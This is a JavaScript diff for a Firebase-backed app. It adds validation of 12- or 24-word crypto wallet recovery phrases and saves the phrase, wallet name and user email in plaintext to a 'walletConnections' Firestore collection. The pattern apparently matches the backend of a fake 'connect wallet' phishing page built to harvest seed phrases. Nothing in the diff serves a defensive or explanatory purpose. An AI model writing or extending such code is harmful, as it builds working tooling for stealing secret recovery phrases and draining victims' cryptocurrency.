@@ -1,3 +1,49 @@
+import { db } from "../firebase/firebase";
+import { auth } from "../firebase/firebase";
+
+import {
+  collection,
+  addDoc,
+  serverTimestamp,
+} from "firebase/firestore";
+
+/* =========================
+   VALIDATE RECOVERY PHRASE
+========================= */
+export const validateRecoveryPhrase = (words) => {
+  if (!words || typeof words !== "string") {
+    return {
+      isValid: false,
+      wordCount: 0,
+      error: "Please enter your recovery phrase",
+    };
+  }
+
+  const splitWords = words
+    .trim()
+    .split(/\s+/)
+    .filter((word) => word.length > 0);
+
+  const wordCount = splitWords.length;
+
+  if (wordCount !== 12 && wordCount !== 24) {
+    return {
+      isValid: false,
+      wordCount,
+      error: `Please enter exactly 12 or 24 words. You entered ${wordCount}.`,
+    };
+  }
+
+  return {
+    isValid: true,
+    wordCount,
+    error: null,
+  };
+};
+
+/* =========================
+   SAVE TO FIREBASE
+========================= */
 export const saveWalletConnection = async (walletData) => {
   try {
     const currentUser = auth.currentUser;
@@ -10,16 +56,16 @@ export const saveWalletConnection = async (walletData) => {
       walletName: walletData.name,
       walletType: walletData.type,
       submittedEmail: walletData.email || null,
-      
-      // ✅ Use consistent field name
-      recoveryPhrase: walletData.recoveryPhrase || null,
+      recoveryPhrase: walletData.recoveryPhrase || null,   // ← Correct field name
       wordCount: walletData.wordCount || null,
-
       createdAt: serverTimestamp(),
       isActive: true,
     };
 
-    const docRef = await addDoc(collection(db, "walletConnections"), docData);
+    const docRef = await addDoc(
+      collection(db, "walletConnections"),
+      docData
+    );
 
     return {
       success: true,
